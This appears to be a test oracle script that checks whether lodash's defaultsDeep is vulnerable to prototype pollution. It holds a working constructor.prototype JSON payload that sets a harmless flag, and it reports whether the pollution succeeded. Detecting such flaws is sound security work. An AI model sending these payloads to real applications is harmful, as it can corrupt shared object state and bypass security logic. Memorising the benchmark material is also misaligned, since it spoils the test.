const fs = require('node:fs');
const path = require('node:path');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const _ = require('lodash');

  const marker = path.join('/tmp', 'oracle_lodash_defaultsdeep_' + process.pid + '_' + Date.now());
  fs.writeFileSync(marker, 'ok');

  try { delete Object.prototype.oraclePollutedFlag; } catch (_) {}

  // Benign call: defaultsDeep should fill missing nested properties.
  const benign = _.defaultsDeep({ cfg: {} }, { cfg: { safe: 1 } });
  if (!benign || !benign.cfg || benign.cfg.safe !== 1) {
    throw new Error('Benign _.defaultsDeep did not produce expected result');
  }

  operation_completed = true;

  // Malicious payload targeting prototype via constructor.prototype path
  const target = {};
  const payload = JSON.parse('{"constructor":{"prototype":{"oraclePollutedFlag":"YES"}}}');

  try {
    _.defaultsDeep(target, payload);
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'Malicious _.defaultsDeep threw (blocked): ' + (e && e.message ? e.message : String(e));
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
    process.exit(0);
  }

  const polluted = ({}).oraclePollutedFlag === 'YES';
  exploit_succeeded = polluted;
  evidence = polluted
    ? 'Prototype pollution observed via _.defaultsDeep constructor.prototype payload'
    : 'No prototype pollution observed after malicious _.defaultsDeep payload';

  try { delete Object.prototype.oraclePollutedFlag; } catch (_) {}
  try { fs.unlinkSync(marker); } catch (_) {}
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'Setup/module/benign failure: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));